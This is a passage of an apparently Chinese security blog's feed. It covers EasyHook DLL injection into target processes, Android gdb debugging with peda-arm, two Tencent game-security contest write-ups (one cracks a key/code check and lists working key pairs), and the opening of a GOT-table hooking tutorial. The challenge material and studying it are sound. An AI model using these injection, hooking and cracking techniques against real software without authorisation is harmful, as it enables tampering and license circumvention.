payload指令集必须包含一个public类来实现此接口。</li></ol><p>待完成注入后payload将使用EasyHook.LocalHook来创建钩子。</p><h3 id="EasyHook-RemoteHooking-Inject"><a href="#EasyHook-RemoteHooking-Inject" class="headerlink" title="EasyHook.RemoteHooking.Inject"></a>EasyHook.RemoteHooking.Inject</h3><ul><li>1.&emsp;EasyHook.RemoteHooking.Inject 序列化配置，包括payload集合的路径和参数。</li><li><p>2.&emsp;向指定的目标进程中注入原生EasyHook32.dll或EasyHook64.dll依赖于它本身是32位或64位。如果有必要的话，EasyHook将自动使用EasyHookSvc32/64.exe来帮助程序将32位注入到64位中或反过来。</p><p>  EasyHook.RemoteHooking.Inject 将会等待，直到它超时或者它已经发出注入已完成/失败的信号。</p></li></ul><p>– 此时已运行在目标进程中 –</p><ul><li><p>3.&emsp;EasyHook32/64.dll通过加载EasyLoad32/64.dll来完成“managed injection”<br>（EasyLoad尝试创建一个新的AppDomain，以便可以卸载注入库）<br>（EasyHook32/64.dll发出EasyHook.RemoteHooking.Inject注入完成的信号）</p></li><li><p>4.&emsp;EasyLoad将托管程序集EasyHook.dll加载到目标进程并调用EasyHook.InjectionLoader.Main方法。</p></li><li>5.&emsp;EasyHook.InjectionLoader反序列化配置，加载有效负载程序集并查找与提供给EasyHook.RemoteHooking.Inject调用的参数相匹配的EasyHook.IEntryPoint。</li><li>6.&emsp;如果找到，就会实例化payload集合中相匹配的EasyHook.IEntryPoint并最终调用对应的Run方法。</li><li>7.&emsp;Payload的Run方法安装若干钩子。</li></ul><p>&emsp;&emsp;&emsp;&emsp;最后当Run方法退出后，EasyLoad将会尝试卸载AppDomain</p><h3 id="EasyHook-RemoteHooking-CreateAndInject"><a href="#EasyHook-RemoteHooking-CreateAndInject" class="headerlink" title="EasyHook.RemoteHooking.CreateAndInject"></a>EasyHook.RemoteHooking.CreateAndInject</h3><ol><li>从提供的可执行路径和命令行以挂起状态创建一个新进程。</li><li>按照EasyHook.RemoteHooking.Inject的运行逻辑。</li><li>被创建的进程会保持被挂起的状态直到payload调用RemoteHooking.WakeUpProcess。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;EasyHook-FileMonitorHook&quot;&gt;&lt;a href=&quot;#EasyHook-FileMonitorHook&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>望</title>
    <link href="http://fancy-blogs.com/2018/08/03/play20180803/"/>
    <id>http://fancy-blogs.com/2018/08/03/play20180803/</id>
    <published>2018-08-03T06:16:31.975Z</published>
    <updated>2018-08-07T06:45:43.023Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><p>四周张望，空旷得慌张；看着远方，残云里惘惘。你的出现，拉近了我的焦点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;p&gt;四周张望，空旷得慌张；看着远方，残云里惘惘。你的出现，拉近了我的焦点。&lt;/p&gt;

      
    
    </summary>
    
      <category term="play" scheme="http://fancy-blogs.com/categories/play/"/>
    
    
  </entry>
  
  <entry>
    <title>远</title>
    <link href="http://fancy-blogs.com/2018/08/01/play201808012/"/>
    <id>http://fancy-blogs.com/2018/08/01/play201808012/</id>
    <published>2018-08-01T04:24:22.576Z</published>
    <updated>2018-08-02T04:18:50.434Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><p>遇了越来越多的人，说着越来越少的话，在越来越小的屋子里，等着越来越远的云。<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;梦见越来越模糊的你。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;p&gt;遇了越来越多的人，说着越来越少的话，在越来越小的屋子里，等着越来越远的云。&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b
      
    
    </summary>
    
      <category term="play" scheme="http://fancy-blogs.com/categories/play/"/>
    
    
  </entry>
  
  <entry>
    <title>意</title>
    <link href="http://fancy-blogs.com/2018/08/01/play20180801/"/>
    <id>http://fancy-blogs.com/2018/08/01/play20180801/</id>
    <published>2018-08-01T01:37:08.441Z</published>
    <updated>2018-08-01T04:38:14.467Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><p>蝉，吵得身临其境。雪，下得记忆犹新。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;p&gt;蝉，吵得身临其境。雪，下得记忆犹新。&lt;/p&gt;

      
    
    </summary>
    
      <category term="play" scheme="http://fancy-blogs.com/categories/play/"/>
    
    
  </entry>
  
  <entry>
    <title>NDK gdb插件——peda-arm</title>
    <link href="http://fancy-blogs.com/2018/07/23/androidgdbplus/"/>
    <id>http://fancy-blogs.com/2018/07/23/androidgdbplus/</id>
    <published>2018-07-23T06:38:24.593Z</published>
    <updated>2019-02-25T03:37:25.379Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="NDK-gdb插件——peda-arm"><a href="#NDK-gdb插件——peda-arm" class="headerlink" title="NDK gdb插件——peda-arm"></a>NDK gdb插件——peda-arm</h1><p>gdb调试时配合插件可以提高效率，Linux下gdb调试可以使用peda、gef等。在android调试里，使用gdbserver配合gdb可以远程调试，那有没有对应的插件呢？<br>最近发现一款支持arm的插件，是peda改的，<a href="https://github.com/alset0326/peda-arm" target="_blank" rel="noopener">peda-arm</a>.</p><h2 id="安装流程"><a href="#安装流程" class="headerlink" title="安装流程"></a>安装流程</h2><p>从github上拉下来后，直接把文件夹复制过去。<br>gdb的目录(MACOS)是：<br><code>/Users/username/Library/Android/sdk/ndk-bundle/prebuilt/darwin-x86_64/bin</code><br>反正在ndk的目录下。<br>把clone下来的文件夹复制进去。<br><img src="/2018/07/23/androidgdbplus/15323283415621.jpg" alt="w100"></p><p>修改初始化配置文件:<br><code>echo “source ./peda-arm/peda-arm.py” &gt;&gt; ./.gdbinit</code></p><h2 id="启动调试"><a href="#启动调试" class="headerlink" title="启动调试"></a>启动调试</h2><p>把gdbserver上传到手机后：<br><code>gdbserver remote:port --attach targetpid</code></p><p>本地端口转发<br><code>adb forward tcp:port tcp:port</code></p><p>gdb调试<br><code>./gdb</code><br><code>target remote:port</code></p><p><img src="/2018/07/23/androidgdbplus/15323286476307.jpg" alt="w100"></p><p>这用就OK啦。</p><p>Debug for fun～</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;NDK-gdb插件——peda-arm&quot;&gt;&lt;a href=&quot;#NDK-gdb插件——peda-arm&quot; class=&quot;headerlink&quot; title=&quot;NDK 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>腾讯游戏安全技术竞赛决赛第一题writeup</title>
    <link href="http://fancy-blogs.com/2018/05/04/mtp2/"/>
    <id>http://fancy-blogs.com/2018/05/04/mtp2/</id>
    <published>2018-05-04T08:07:53.876Z</published>
    <updated>2019-02-25T03:59:29.252Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="腾讯游戏安全技术竞赛决赛第一题writeup"><a href="#腾讯游戏安全技术竞赛决赛第一题writeup" class="headerlink" title="腾讯游戏安全技术竞赛决赛第一题writeup"></a>腾讯游戏安全技术竞赛决赛第一题writeup</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目是用OpenGL ES 3.0编写的一个程序，用<code>textures/container.jpg</code>作为贴图，去渲染。目的是去寻找绘制出的flag，由于绘制区域限制，移动不到绘制区域。</p><h2 id="做题过程"><a href="#做题过程" class="headerlink" title="做题过程"></a>做题过程</h2><p>之前没有接触过openGL，相关函数一个个找，浏览了《opengl es 3.0 编程指南》。</p><p>贴图绑定：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sub_30604(v23);</span><br><span class="line">dword_AA108 = v23;</span><br><span class="line">_aeabi_memcpy8(&amp;v48, dword_A1AA0, 720);</span><br><span class="line">glGenVertexArrays(1, &amp;v38);</span><br><span class="line">glGenBuffers(1, &amp;v39);</span><br><span class="line">glBindVertexArray(v38);</span><br><span class="line">glBindBuffer(0x8892, v39);</span><br><span class="line">glBufferData(0x8892, 720, &amp;v48, 35044);</span><br><span class="line">glVertexAttribPointer(0, 3, 0x1406, 0, 20, 0);</span><br><span class="line">glEnableVertexAttribArray(0);</span><br><span class="line">glVertexAttribPointer(1, 2, 5126, 0, 20, 12);</span><br><span class="line">glEnableVertexAttribArray(1);</span><br><span class="line">glGenTextures(1, &amp;textures);</span><br><span class="line">glBindTexture(0xDE1u, textures);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2802u, 10497);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2803u, 10497);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2801u, 9729);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2800u, 9729);</span><br><span class="line">pixels = (const GLvoid *)sub_31578(v42, v43, &amp;v35, &amp;v34, &amp;v33, 0);</span><br><span class="line">      if ( pixels )</span><br><span class="line">      &#123;</span><br><span class="line">        glTexImage2D(0xDE1u, 0, 6407, *(GLsizei *)&amp;v35, v34, 0, 0x1907u, 0x1401u, pixels);</span><br><span class="line">        glGenerateMipmap(3553);</span><br><span class="line">      &#125;</span><br><span class="line">      j_j_free(pixels);</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>将<code>textures/container.jpg</code>作为贴图纹理，<code>dword_A1AA0</code>为顶点数组（36个坐标），得到的结果就是一个立方体（以三角形为单位渲染，6<em> 2 </em>3=36）。</p><p>在程序中看到一个箭头上布满了箱子，就是以图片纹理渲染出的箱子来布满箭头。</p><p>找到的资料都是单个图像渲染，没找到怎么设置贴图目标。</p><p>找屏幕显示的地方，sub_30098里看到屏幕清除的函数，下面是一大堆浮点运算。该不会是逆浮点运算过程吧？？<br>找了一下数据来源：<code>dword_AA0FC</code><br>在so的init里找到了函数，里面是对着色器代码的复制，还有就是<code>dword_AA0FC</code>的赋值，数据来源就是<code>dword_9E8D8</code>。一堆数据，分析之后是浮点数，联系之前顶点坐标也是浮点数组，那么这也是个坐标数组。</p><p>一番搜索，glDrawElements和glDrawArrays是绘制函数，在绘制前，调用<code>glUniformMatrix4fv</code>,通过uniform上传至GPU,来绘制最终的图像。调试中发现传入的指针指向的是空数组。不清楚为什么。从代码来看就是将，dword_AA0FC传入的数据，每个循环处理x和y坐标。刚刚那个座标是一个三维坐标。</p><p>没仔细研究一大段的浮点运算具体是干什么的，猜测是三维到二维的映射计算。</p><p>把dword_9E8D8数据抠出来。用matplotlib绘制出来。哇！惊喜，这个坐标数组就是绘制图像的坐标数组。</p><p><img src="/2018/05/04/mtp2/15254223943601.jpg" alt=""></p><p>由于旧的题里出现了flag的图片，还是给了不少启示的，所以这题做的还是有点侥幸的。</p><h2 id="OpenGL相关"><a href="#OpenGL相关" class="headerlink" title="OpenGL相关"></a>OpenGL相关</h2><p>有关OpenGL的知识，需要了解一下几个概念。<br>这个系列文章写的不错：<a href="http://www.cnblogs.com/lijihong/p/5365677.html" target="_blank" rel="noopener">http://www.cnblogs.com/lijihong/p/5365677.html</a></p><h3 id="vertex-顶点"><a href="#vertex-顶点" class="headerlink" title="vertex(顶点)"></a>vertex(顶点)</h3><p>在设置贴图映射和绘制对象时会用到顶点。</p><p>例如在贴图映射中，会指定贴图所需要映射方式的一个顶点数组。如下是一个浮点数组。<br><img src="/2018/05/04/mtp2/15262860614297.jpg" alt=""></p><h3 id="VBO-顶点缓冲对象"><a href="#VBO-顶点缓冲对象" class="headerlink" title="VBO(顶点缓冲对象)"></a>VBO(顶点缓冲对象)</h3><p>顶点缓冲对象VBO是在显卡存储空间中开辟出的一块内存缓存区，用于存储顶点的各类属性信息，如顶点坐标，顶点法向量，顶点颜色数据等。在渲染时，可以直接从VBO中取出顶点的各类属性数据，由于VBO在显存而不是在内存中，不需要从CPU传输数据，处理效率更高。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">static void CreateVertexBuffer()</span><br><span class="line">&#123;</span><br><span class="line">    // 创建含有一个顶点的顶点数组</span><br><span class="line">    Vector3f Vertices[1];</span><br><span class="line">    // 将点置于屏幕中央</span><br><span class="line">    Vertices[0] = Vector3f(0.0f, 0.0f, 0.0f);</span><br><span class="line"></span><br><span class="line">    // 创建缓冲器</span><br><span class="line">    glGenBuffers(1, &amp;VBO);</span><br><span class="line">    // 绑定GL_ARRAY_BUFFER缓冲器</span><br><span class="line">    glBindBuffer(GL_ARRAY_BUFFER, VBO);</span><br><span class="line">    // 绑定顶点数据</span><br><span class="line">    glBufferData(GL_ARRAY_BUFFER, sizeof(Vertices), Vertices, GL_STATIC_DRAW);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Shader-着色器"><a href="#Shader-着色器" class="headerlink" title="Shader(着色器)"></a>Shader(着色器)</h3><p>图形渲染管线接受一组3D坐标，然后把它们转变为你屏幕上的有色2D像素输出。图形渲染管线可以被划分为几个阶段，每个阶段将会把前一个阶段的输出作为输入。所有这些阶段都是高度专门化的（它们都有一个特定的函数），并且很容易并行执行。正是由于它们具有并行执行的特性，当今大多数显卡都有成千上万的小处理核心，它们在GPU上为每一个（渲染管线）阶段运行各自的小程序，从而在图形渲染管线中快速处理你的数据。这些小程序叫做着色器(Shader)。</p><p>在so中的init区段初始化了着色器代码。<br><img src="/2018/05/04/mtp2/15262922120545.jpg" alt="0-w500"></p><p><img src="/2018/05/04/mtp2/15262922381037.jpg" alt="1-w500"></p><p><code>sub_30604(v23);</code>函数中完成了对着色器的创建和编译绑定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GLuint ShaderProgram = glCreateProgram(); </span><br><span class="line">GLuint ShaderObj = glCreateShader(ShaderType); </span><br><span class="line">glShaderSource(ShaderObj, 1, p, Lengths); </span><br><span class="line">glCompileShader(ShaderObj); </span><br><span class="line">glAttachShader(ShaderProgram, ShaderObj); </span><br><span class="line">glUseProgram(ShaderProgram);</span><br></pre></td></tr></table></figure><p>详细解释参考：<a href="https://blog.csdn.net/cordova/article/details/52495077" target="_blank" rel="noopener">https://blog.csdn.net/cordova/article/details/52495077</a></p><p>图形渲染管线的每个阶段的抽象展示。要注意蓝色部分代表的是我们可以注入自定义的着色器的部分。<br><img src="https://pic4.zhimg.com/80/v2-1e286dd517c717e3f1c48792275f7e87_hd.jpg" alt=""><br>摘自：<a href="https://www.zhihu.com/question/29163054" target="_blank" rel="noopener">https://www.zhihu.com/question/29163054</a></p><h3 id="贴图纹理"><a href="#贴图纹理" class="headerlink" title="贴图纹理"></a>贴图纹理</h3><p>为了实现纹理贴图我们需要做三件事：<br>将一张贴图加载到OpenGL中<br>提供纹理坐标和顶点（将纹理对应匹配到顶点上）<br>并使用纹理坐标从纹理中进行取样操作取得像素颜色</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sub_2F79C(*(_DWORD *)(*(_DWORD *)(v10 + 12) + 32), &quot;textures/container.jpg&quot;, &amp;v42);</span><br><span class="line">...</span><br><span class="line">sub_30604(v23);</span><br><span class="line">dword_AA108 = v23;</span><br><span class="line">_aeabi_memcpy8(&amp;v48, dword_A1AA0, 720);</span><br><span class="line">glGenVertexArrays(1, &amp;v38);</span><br><span class="line">glGenBuffers(1, &amp;v39);</span><br><span class="line">glBindVertexArray(v38);</span><br><span class="line">glBindBuffer(0x8892, v39);</span><br><span class="line">glBufferData(0x8892, 720, &amp;v48, 35044);</span><br><span class="line">glVertexAttribPointer(0, 3, 0x1406, 0, 20, 0);</span><br><span class="line">glEnableVertexAttribArray(0);</span><br><span class="line">glVertexAttribPointer(1, 2, 5126, 0, 20, 12);</span><br><span class="line">glEnableVertexAttribArray(1);</span><br><span class="line">glGenTextures(1, &amp;textures);</span><br><span class="line">glBindTexture(0xDE1u, textures);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2802u, 10497);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2803u, 10497);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2801u, 9729);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2800u, 9729);</span><br><span class="line">pixels = (const GLvoid *)sub_31578(v42, v43, &amp;v35, &amp;v34, &amp;v33, 0);</span><br><span class="line">      if ( pixels )</span><br><span class="line">      &#123;</span><br><span class="line">        glTexImage2D(0xDE1u, 0, 6407, *(GLsizei *)&amp;v35, v34, 0, 0x1907u, 0x1401u, pixels);</span><br><span class="line">        glGenerateMipmap(3553);</span><br><span class="line">      &#125;</span><br><span class="line">      j_j_free(pixels);</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>将<code>textures/container.jpg</code>作为贴图纹理，<code>dword_A1AA0</code>为顶点数组（顶点数组是<strong>顶点</strong>中的截图），得到的结果就是一个立方体（以三角形为单位渲染，6<em> 2 </em>3=36）。</p><p>函数详解参考：<a href="https://blog.csdn.net/cordova/article/details/52825859" target="_blank" rel="noopener">https://blog.csdn.net/cordova/article/details/52825859</a></p><h3 id="帧缓冲区"><a href="#帧缓冲区" class="headerlink" title="帧缓冲区"></a>帧缓冲区</h3><h3 id="glUniform函数"><a href="#glUniform函数" class="headerlink" title="glUniform函数"></a>glUniform函数</h3><p>uniform修饰符可以指定一个在应用中设置好的变量，它不会在图元处理的过程中发生变化，且在所有的着色阶段之间都是共享的——着色器中的全局变量。</p><p>详细参考：<a href="https://www.cnblogs.com/android-blogs/p/5454692.html" target="_blank" rel="noopener">https://www.cnblogs.com/android-blogs/p/5454692.html</a></p><p><code>sub_30098(int a1)</code>函数中对顶点的x、y坐标处理后会调用到<code>sub_30EEC(int *a1, int a2, int a3)</code>,这个函数里就包含了<code>glGetUniformLocation(v5, v4);</code>和<code>j_glUniformMatrix4fv(v6, 1, 0, v3);</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;腾讯游戏安全技术竞赛决赛第一题writeup&quot;&gt;&lt;a href=&quot;#腾讯游戏安全技术竞赛决赛第一题writeup&quot; class=&quot;headerlink&quot; title
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>腾讯游戏安全技术移动平台资格题writeup</title>
    <link href="http://fancy-blogs.com/2018/04/23/mtp-mobile-1/"/>
    <id>http://fancy-blogs.com/2018/04/23/mtp-mobile-1/</id>
    <published>2018-04-22T17:36:08.650Z</published>
    <updated>2019-02-25T05:05:17.117Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="腾讯游戏安全技术移动平台资格题writeup"><a href="#腾讯游戏安全技术移动平台资格题writeup" class="headerlink" title="腾讯游戏安全技术移动平台资格题writeup"></a>腾讯游戏安全技术移动平台资格题writeup</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目要求输入key和code，匹配则会显示“success！”，否则显示“fail！”。<br>有standard和advance两个版本，advance比standard多一个函数，这里时间原因只做到了standard版本，最近每周都有ctf。</p><h3 id="key相关"><a href="#key相关" class="headerlink" title="key相关"></a>key相关</h3><blockquote><p>key只能是数字，字母a(A)～f(F)，如果是小写，会被转为大写。<br>将keystr以”#”间隔，拆分，放入vector<br>sub_4864将keystr 拆分为8块，校验每块长度不为0<br>最后会对每块取值运算，要求每块4字节，所以结构是<code>****#****#****#****#****#****#****#****</code></p></blockquote><p>sub_496C函数传入keystr，生成5个int64，用于后面校验。</p><p>生成规则脚本里有，不作详解。大概就是每次运算取vector中两个项中各一字节，参与指定运算。前两个还算有规律，后面就没什么规律了。关于这里的代码，似乎是经过混淆，循环被平坦化了。</p><p>脚本是python的，所以对数据的类型处理不是很好，可能存在bug。好尴尬。</p><h3 id="code相关"><a href="#code相关" class="headerlink" title="code相关"></a>code相关</h3><blockquote><p>输入长度需要是偶数<br>长度需要是44（由生成数据的长度决定）<br>最后12字符确定()（由生产数据的最后9字节决定）<br>最后以”=”结束</p></blockquote><p>sub_7114函数传入codestr，生成一个vector，用于后面校验。</p><p>每4字节生成3字节数据，根据字节在已知字符串<code>&quot;ZO6Kq79L&amp;CPWvNopzQfghDRSG@di*kAB8rsFewxlm+/u5a^2YtTJUVEn0$HI34y#=&quot;</code>中的位置来确定数。</p><blockquote><p>block[0]~block[1]-&gt;result[0]<br>block[1]~block[2]-&gt;result[1]<br>block[2]~block[3]-&gt;result[2]</p></blockquote><p>最后生成44/4*3=33字节数据</p><blockquote><p>v11[3] != 0x32303138</p></blockquote><p>决定生成的数据最后8字节，值为(int64)0x0000000032303138<br>由生成规则爆破（爆破代码在脚本注释中）得到“pKqE”、“NeZZ”、“ZZZ”。</p><p>所以code最后12字节为“pKqENeZZZZZ=”</p><h3 id="验证函数"><a href="#验证函数" class="headerlink" title="验证函数"></a>验证函数</h3><p>sub_5658传入key生成的5个int64数和code生成的前24字节数据。</p><p>参数作为8个int64参与运算。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( ((a6 * a1 + a2) * a6 + a3) ^ a7 )        // ((S[0]*v18+v17)*S[0]+v16)==S[1]</span><br><span class="line">    return 0;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  if ( (a2 - a4) * (a2 - a4) == 4 * a1 * (a6 * a4 + a3 - a7) &amp;&amp; a8 == a3 + (a5 * a1 + a2 - a4) * a5 )</span><br><span class="line">    v8 = 1;                                     // (v17-v15)*(v17-v15)==4*v18*(S[0]*v15+v14-S[1])</span><br><span class="line">                                                // S[2]==v16+(v14*v18+v17-v15)*v14</span><br></pre></td></tr></table></figure><p>将code生成的数据当作未知数，整理数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=(4*CH18*CH18)</span><br><span class="line">b=(4*CH18*(CH17-CH15))</span><br><span class="line">c=((CH17-CH15)*(CH17-CH15))</span><br><span class="line"></span><br><span class="line">#b**2==4*a*c</span><br><span class="line">#4*CH18*(CH17-CH15)*4*CH18*(CH17-CH15)==4*4*CH18*CH18*(CH17-CH15)*(CH17-CH15)</span><br></pre></td></tr></table></figure><p>可整理为一个二元一次方程。且delta=0，所以有唯一解。</p><h2 id="注册机编写思路"><a href="#注册机编写思路" class="headerlink" title="注册机编写思路"></a>注册机编写思路</h2><p>要求由输入key来计算code，key可以生成5个int64，通过还原程序的计算过程，将5个数计算出来。此时验证函数中，把code的数据当作未知数，已有系数，由整理得到的方程解出S[0],再计算得出S[1],S[2]。</p><blockquote><p>S[0]，S[1]，S[2]分别数code生成的前24字节组成的3个int64</p></blockquote><p>得到code生成的数据后，反推code输入，已经知道了code的生成规则，和之前得到code的最后12个字节一样，爆破处理，每4字节生成3字节数据，那么就3字节3字节处理。</p><p>每3字节得到4字节输入，24/3*4=32，加上已知的12字节，32+12=44，正好输入44字节。</p><h3 id="注册机使用"><a href="#注册机使用" class="headerlink" title="注册机使用"></a>注册机使用</h3><p>脚本测试环境：Python 2.7.14<br>MYKEY设置成key，注意格式。<br>运行脚本即可，最后输出的结果即是code.</p><p>几组跑出来的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ab1D#2BCE#A41B#EA2A#B3CD#8A0A#AB31#0FF0</span><br><span class="line">dn57ZfZZZZK^wxgp$FhxiamNJlIRtD20pKqENeZZZZZ=</span><br><span class="line"></span><br><span class="line">1b1D#2BCE#141B#EA2A#13CD#8A0A#1B31#0FF0</span><br><span class="line">ynoJZZZZZZK^wFr#*kEHd#uT&amp;3YdEUsBpKqENeZZZZZ=</span><br><span class="line"></span><br><span class="line">AAAA#bbbb#1111#cccc#defa#3333#4317#98f1</span><br><span class="line">OEH46EZZZZZwJYDWiCe*v0Fd@Gqo5zR9pKqENeZZZZZ=</span><br></pre></td></tr></table></figure><p>截图：<br><img src="/2018/04/23/mtp-mobile-1/success.jpg" alt="success-w400"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;腾讯游戏安全技术移动平台资格题writeup&quot;&gt;&lt;a href=&quot;#腾讯游戏安全技术移动平台资格题writeup&quot; class=&quot;headerlink&quot; title
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>GOT表hook</title>
    <link href="http://fancy-blogs.com/2018/04/08/GOTHOOK/"/>
    <id>http://fancy-blogs.com/2018/04/08/GOTHOOK/</id>
    <published>2018-04-08T15:51:17.108Z</published>
    <updated>2019-02-25T05:06:53.755Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="GOT表hook"><a href="#GOT表hook" class="headerlink" title="GOT表hook"></a>GOT表hook</h1><p>&emsp;&emsp;ELF文件中，GOT表和PLT表，不同映像间的函数和数据引用都是通过它们实现的。GOT（全局偏移表）给出了映像中所有被引用符号（函数或变量）的值。每个普通PLT表项相当于一个函数的桩函数（stub），支持懒绑定的情况下，当发生对外部函数的调用时，程序会通过PLT表将控制交给动态连接器，后者解析出函数的绝对地址，修改GOT中相应的值，之后的调用将不再需要连接器的绑定。由于linker是不支持懒绑定的，所以在进程初始化时，动态链接器首先解析出外部过程引用的绝对地址，一次性的修改所有相应的GOT表项。对共享对象来说，由于GOT，PLT节以及代码段和数据段之间的相对位置是固定的，所有引用都是基于一个固定地址（GOT）的偏移量，所以实现了PIC代码，重定位时只需要修改可写段中的GOT表。而可执行程序在连接过程中则可能发生对不可写段的修改。如果只读段和可写段不是以固定的相对位置加载的，那么在重定位是还需要修改所有指向GOT的指针。</p><h2 id="本地hook"><a href="#本地hook" class="headerlink" title="本地hook"></a>本地hook</h2><h3 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h3><p>&emsp;&emsp;我们需要了解一下ELF文件的结构，因为我们得到GOT表地址是通过ELF文件格式中的字段来一步步索引的。<br>&emsp;&emsp;索引过程为：从ELFHeader里找到字符串表，因为要找节表是通过名称来搜索的，所以首先要字符串表的地址。<br><strong>ELFHeader</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">typedef struct elf32_hdr &#123;</span><br><span class="line">  unsigned char e_ident[EI_NIDENT];</span><br><span class="line">  Elf32_Half e_type;</span><br><span class="line">  Elf32_Half e_machine;</span><br><span class="line">  Elf32_Word 